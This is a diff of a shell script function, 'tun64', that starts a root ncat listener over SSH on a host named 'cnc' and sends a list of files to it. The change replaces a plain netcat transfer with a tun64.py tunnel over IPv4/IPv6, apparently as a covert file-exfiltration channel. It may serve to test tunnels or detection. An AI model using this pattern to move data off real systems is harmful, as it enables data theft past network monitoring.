@@ -107,14 +107,14 @@ tun64 () {
 
 	for file in "${files[@]}"; do
 
-		cmd="ncat -$ver -$protocol -w 3 -lp $port --output /tmp/netcat.log"
+		cmd="ncat -$ver -$protocol -w 3 -lp $port --output /tmp/tun64.log"
 		echo "starting listener on port $port with protocol -$protocol on version $ver"
 		echo "command is:"
 		echo "$cmd"
 		ssh -p $cnc_ssh_port root@$cnc screen -m -d "$cmd" || echo fail
 		sleep 2
 
-		cmd="cat $file | ncat -w 3 $dest_ip -$protocol $port"
+		cmd="/root/tun64/tun64.py -i eth1 -vv --$mode -s4 192.168.11.11 -d4 $cnc_4 -d6 $cnc6 -dp $port -$proto_key -m \"\`cat $file\`\""
 		echo "attempting file transfer $file on port $port with protocol -$protocol on version $ver"
 		echo "command is:"
 		echo "$cmd"
